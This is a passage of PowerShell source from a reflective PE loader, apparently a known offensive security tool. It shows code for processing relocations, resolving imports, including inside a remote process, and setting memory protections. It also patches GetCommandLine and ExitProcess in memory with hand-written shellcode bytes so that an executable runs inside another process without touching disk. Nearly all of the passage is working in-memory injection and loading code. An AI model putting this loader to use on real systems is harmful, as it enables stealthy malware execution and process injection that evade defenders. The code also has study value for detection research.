		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
